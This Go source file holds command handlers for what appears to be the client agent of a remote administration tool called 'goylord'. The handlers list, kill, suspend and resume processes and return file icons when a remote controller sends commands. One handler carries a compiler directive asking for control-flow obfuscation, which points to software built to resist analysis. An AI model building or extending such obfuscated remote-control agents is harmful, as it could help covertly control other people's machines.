package handlers

import (
	"context"
	"log"

	agentRuntime "goylord-client/cmd/agent/runtime"
	"goylord-client/cmd/agent/wire"
)

func HandleProcessList(ctx context.Context, env *agentRuntime.Env, cmdID string) error {
	log.Printf("process_list: listing all processes")

	processes := []wire.ProcessInfo{}
	var errMsg string

	procs, err := listProcesses()
	if err != nil {
		errMsg = err.Error()
		log.Printf("process_list error: %v", err)
	} else {
		processes = procs
	}

	result := wire.ProcessListResult{
		Type:      "process_list_result",
		CommandID: cmdID,
		Processes: processes,
		Error:     errMsg,
	}

	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleProcessKill(ctx context.Context, env *agentRuntime.Env, cmdID string, pid int32) error {
	//garble:controlflow block_splits=10 junk_jumps=10 flatten_passes=2
	log.Printf("process_kill: %d", pid)

	err := killProcess(pid)
	ok := err == nil
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}

	result := wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        ok,
		Message:   errMsg,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleProcessSuspend(ctx context.Context, env *agentRuntime.Env, cmdID string, pid int32) error {
	log.Printf("process_suspend: %d", pid)

	err := suspendProcess(pid)
	ok := err == nil
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}

	result := wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        ok,
		Message:   errMsg,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleProcessResume(ctx context.Context, env *agentRuntime.Env, cmdID string, pid int32) error {
	log.Printf("process_resume: %d", pid)

	err := resumeProcess(pid)
	ok := err == nil
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}

	result := wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        ok,
		Message:   errMsg,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleProcessIcon(ctx context.Context, env *agentRuntime.Env, cmdID string, items []wire.FileIconRequestItem) error {
	out := make([]wire.FileIconResultItem, 0, len(items))
	for _, item := range items {
		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}
		png, err := extractFileIconPNG(item.Path, item.Ext)
		ri := wire.FileIconResultItem{Key: item.Key}
		if err != nil {
			ri.Error = err.Error()
		} else {
			ri.PNG = png
		}
		out = append(out, ri)
	}
	return wire.WriteMsg(ctx, env.Conn, wire.FileIconResult{
		Type:      "process_icon_result",
		CommandID: cmdID,
		Icons:     out,
	})
}
